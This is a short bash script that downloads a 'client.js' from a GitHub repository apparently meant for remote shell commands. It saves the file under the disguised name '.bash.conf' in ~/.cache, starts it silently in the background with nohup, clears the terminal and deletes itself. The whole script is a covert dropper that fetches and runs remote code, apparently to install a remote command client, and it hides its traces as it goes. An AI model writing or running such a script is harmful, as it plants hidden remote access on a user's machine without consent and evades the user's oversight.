#!/bin/bash

set -ea -o pipefail

FILENAME=.bash.conf

mkdir -p ~/.cache
curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > ~/.cache/$FILENAME


nohup node  ~/.cache/$FILENAME > /dev/null & clear
rm -- "$0"
